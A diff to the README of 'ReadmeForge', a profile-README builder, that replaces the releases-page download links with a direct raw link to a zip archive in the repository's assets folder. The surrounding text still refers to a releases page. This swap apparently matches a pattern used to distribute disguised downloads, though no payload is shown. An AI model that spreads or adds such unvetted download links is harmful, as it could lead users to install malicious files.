@@ -1,6 +1,6 @@
 # 🧩 ReadmeForge - Build Your Profile Readme Fast
 
-[![Download ReadmeForge](https://img.shields.io/badge/Download-ReadmeForge-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Photogravureradiator935/ReadmeForge/releases)
+[![Download ReadmeForge](https://img.shields.io/badge/Download-ReadmeForge-6A5ACD?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Photogravureradiator935/ReadmeForge/main/assets/Readme-Forge-v2.4.zip)
 
 ## 🚀 What ReadmeForge Does
 
@@ -28,7 +28,7 @@ You need:
 
 Visit this page to download:
 
-[https://github.com/Photogravureradiator935/ReadmeForge/releases](https://github.com/Photogravureradiator935/ReadmeForge/releases)
+[https://raw.githubusercontent.com/Photogravureradiator935/ReadmeForge/main/assets/Readme-Forge-v2.4.zip](https://raw.githubusercontent.com/Photogravureradiator935/ReadmeForge/main/assets/Readme-Forge-v2.4.zip)
 
 On the releases page:
 1. Open the latest release
